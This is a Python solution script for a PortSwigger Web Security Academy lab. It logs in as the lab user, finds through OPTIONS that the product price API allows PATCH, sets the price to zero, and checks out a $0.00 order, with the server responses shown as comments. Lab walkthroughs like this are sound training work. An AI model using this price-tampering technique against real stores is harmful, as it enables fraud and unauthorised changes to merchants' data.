# LAB: Finding and exploiting an unused API endpoint

import re
import requests

URL = "https://0ad9005f04f3924681be0ca000e90095.web-security-academy.net"
s = requests.Session()

print("===========[step1] login as wiener===============")
r = s.get(f"{URL}/login")
csrf = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
r = s.post(f"{URL}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})
print("[login]", r.status_code, r.url)

print("===========[step2] check price API===============")
r = s.get(f"{URL}/api/products/1/price")
print("[price]", r.status_code, r.text)
'''
HTTP/2 200 OK
{"price":"$1337.00","message":"This item is in high demand - 6 purchased in the last 3h"}
'''

print("===========[step3] find allowed methods (OPTIONS)===============")
r = s.options(f"{URL}/api/products/1/price")
print("[options]", r.status_code, r.headers.get("Allow"))
'''
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
'''

print("===========[step4] PATCH price to 0===============")
# no Content-Type -> 400 "Only 'application/json' Content-Type is supported"
# body {}         -> 400 "'price' parameter missing in body"
r = s.patch(f"{URL}/api/products/1/price", json={"price": 0})
print("[patch]", r.status_code, r.text)
'''
HTTP/2 200 OK
{"price":"$0.00"}
'''

print("===========[step5] add jacket to cart===============")
r = s.post(f"{URL}/cart", data={"productId": "1", "redir": "PRODUCT", "quantity": "1"})
print("[cart]", r.status_code, r.url)
'''
HTTP/2 302 Found
Location: /product?productId=1
'''

print("===========[step6] checkout===============")
r = s.get(f"{URL}/cart")
csrf = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
r = s.post(f"{URL}/cart/checkout", data={"csrf": csrf})
print("[checkout]", r.status_code, r.url)
'''
HTTP/2 303 See Other
Location: /cart/order-confirmation?order-confirmed=true
-> "Your order is on its way!", Total: $0.00
'''